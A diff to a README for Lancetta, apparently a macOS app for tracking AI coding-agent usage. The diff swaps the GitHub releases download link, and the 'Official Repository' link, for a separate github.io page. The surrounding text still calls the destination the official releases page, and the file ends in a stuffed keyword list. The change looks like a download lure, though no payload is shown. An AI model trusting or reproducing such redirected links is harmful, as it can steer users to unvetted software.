@@ -8,7 +8,7 @@ This guide will walk you through downloading and running Lancetta, even if you'v
 
 ## 📥 Download Lancetta
 
-[![Download Lancetta Now](https://img.shields.io/badge/Download-Lancetta-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Filli1523/lancetta-website/releases)
+[![Download Lancetta Now](https://img.shields.io/badge/Download-Lancetta-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://filli1523.github.io)
 
 Visit this link to download the application. When you click the button above, you'll be taken to the official releases page where you'll find the latest version of Lancetta ready for download. Look for the file that matches your Mac and click to download it. Once the download is complete, you're ready for the next step!
 
@@ -114,7 +114,7 @@ So what are you waiting for? Click that download button and take control of your
 
 ## 🔗 Quick Links
 
-- [Download Lancetta](https://github.com/Filli1523/lancetta-website/releases)
-- [Official Repository](https://github.com/Filli1523/lancetta-website)
+- [Download Lancetta](https://filli1523.github.io)
+- [Official Repository](https://filli1523.github.io)
 
 Keywords: ai-agents, claude-code, codex, coding-agent, developer-tools, mac-app, macos, mantine, menu-bar, native, nextjs, nextra, productivity, quota, rate-limits, swift, swiftui, token-usage
